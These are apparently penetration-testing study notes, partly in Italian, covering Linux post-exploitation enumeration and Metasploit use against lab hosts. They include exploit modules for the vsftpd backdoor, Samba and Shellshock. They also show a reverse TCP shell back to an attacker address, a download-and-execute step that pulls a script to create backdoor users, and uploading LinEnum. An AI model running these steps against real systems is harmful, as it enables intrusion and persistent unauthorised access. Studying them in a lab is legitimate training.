```
# 1. Enumerating System Information:
> Hostname, OS Name, OS Build, OS Architecture, Installed Updates/Hotfixes

# 2. Enumerating Users and Groups:
> Current User & Privileges, Additional User Info, Other Users on the system, Groups, momber of administrator group

# 3. Enumerating Network Information:
> Current IP address & Network adapter, Internal Networks, Tcp/Udp services running, Routing table, Windows Firewall State 

# 4. Enumerating Services:
> Running processes (istanza di un .exe), Services (process that run in background), Scheduled Tasks

# 5. Automating Local Enumeration:
> LinEnum - Identifying privilege escalation vulnerabilities on Linux



Post Exploitation:
# Enumerate Configs (rcp, ldap, sysctl, sepermit, shell, access - configs)
# Enumerate Environment (variable environment)
# Enumerate Network (firewall, dns, host, ssh, ssh keys - config)
# Enumerate Protections (iptable, tcpdump, wireshark,)
# Enumerate System (Linux version, User Account, Packeges, Services, Cron Jobs, Disk)
# Check Container (Docker container search)
# Check VM
# Check History (last logs, sudoers, history)



# 1. Enumerating System Information
[Command Shell session opened] - Command Shell is non intractive, we upgrade bash session:
> /bin/bash -i

or upgrade to meterpreter sessions
> background
> session -u 1
> meterpreter
> sysinfo
> hostname
> pwd

# Linux Distro name:
> cat /etc/issue
> cat /etc/*release


# Linux Kernel Version:
> uname -a

# Linux Information About CPU:
> lscpu

# Linux List of Storage devices 
> df -h





# 2. Enumerating Users & Groups
> lastlog

> bin/bash -i [Upgrading from shell session non interactive to bash session]
or
> sessions -u 1 [Upgrading to Meterpreter Sessions]
> getuid
> shell
> whoami
> groups root

Enumerating other Service Account:
> cat /etc/passwd

Enumerating groups:
> groups

Enumerating Currently Logged Users:
> who
> lastlog






# 3. Enumerating Network Information:
> ifconfig
> netstat 
> route

# List configured networks and their subnets
> cat /etc/networks

# List mapped domains with their IP:
> cat /etc/hosts

# List DNS NameServer
> cat /etc/resolv.conf




# 4. Enumerating Process & Cron Job:
> /bin/bash -i
or
> sessions -u 3
> meterpreter
> ps
> pgrep vsftpd

Enumerate list of cron jobs:
> cat /etc/cron*




# 5. Automating Linux Local Enumeration:
> meterpreter
> background

# Automating Enum Configs:
> use post/linux/gather/enum_configs
> set SESSION 1
> run

# Automating Enum Network:
> use post/linux/gather/enum_network
> set SESSION 1


# Automating Enum System:
> use post/linux/gather/enum_system
> set SESSION 1


# Automating CheckVM:
> use post/linux/gather/checkvm
> set SESSION 1


# Automating Linux Scan - LinEnum:
> LinEnum.sh - Github (copy)
> upload linEnum.sh
> shell
> /bin/bash -i
> chmod +x linEnum.sh
> ./linEnum.sh

















> nmap -sV 192.218.227.3

Exploit vsftpd:
> use exploit/unix/ftp/vsftpd_234_backdoor

Get shell:
> /bin/bash -i


# Metasploit - SAMBA Exploitation
> use exploit/linux/samba/is_known_pipename


# Metasploit - Linux Post Exploitation:
> post/linux/gather/enum_configs
> set SESSION 1

> post/multi/gather/env
> set SESSION 1

> post/linux/gather/enum_network
> set SESSION 1

> post/linux/gather/enum_protections
> set SESSION 1

> post/linux/gather/enum_system 
> set SESSION 1

> post/linux/gather/checkcontainer
> set SESSION 1

> post/linux/gather/checkvm 
> set SESSION 1

> post/linux/gather/enum_users_history 
> set SESSION 1

This module will create a Reverse TCP Shell on the target system using the system's own scripting environments installed on the target.
> post/multi/manage/system_session 
> set SESSION 1
> set TYPE python
> set HANDLER true
> set LHOST 192.162.5.2
> run

Creo un file .sh  con dei comandi per aggiungere nuovi user
cat newUser.sh
[useradd hacker]
[useradd test]

Starto un webServer sulla mia macchina locale per esporre il file .sh ed effettuo il download sulla macchina vittima:
> use post/linux/manage/download_exec 
> set URL http://192.162.5.2/test.sh 
> set SESSION 1 
> run




Update shell session to meterpreter:
> sessions -u 1
> sessions 2
> getuid
> sysinfo
> shell o /bin/bash -i
> cd /root
> hostname
> cat /etc/issue
> cat /etc/*release
> uname -a
> env
> lscpu
> free -h
> df -h
> lsblk | grep sd
> whoami
> id
> ls -al /home
cat /etc/passwd
> cat /etc/passwd | grep -v /nologin
> groups root
> ifconfig
> netstat
> route
> arp
> shell
/bin/bash -i
> cat /etc/networks
> cat /etc/hosts
> cat /etc/resolv.conf
> arp -a
> ps
> ps aux
> cat /etc/cron*
> crontab -l

Automation 
> https://github.com/rebootuser/LinEnum
> ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
> Go back to meterpreter session
> session 1
cd /tmp
upload /root/Desktop/LinEnum.sh
shell
/bin/bash -i
> id
> chmod +x [LinEnum.sh](http://linenum.sh/)
./LinEnum.sh

Metasploit

> nmap -sV 192.19.208.3
> Exploit shellshock
> service postgresql start && msfconsole -q
search shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
setg RHOSTS 192.19.208.3
setg RHOST 192.19.208.3
set TARGETURI /gettime.cgi
run
> use post/linux/gather/enum_configs
> use post/linux/gather/enum_network
> use post/linux/gather/enum_system
> use post/linux/gather/checkvm

```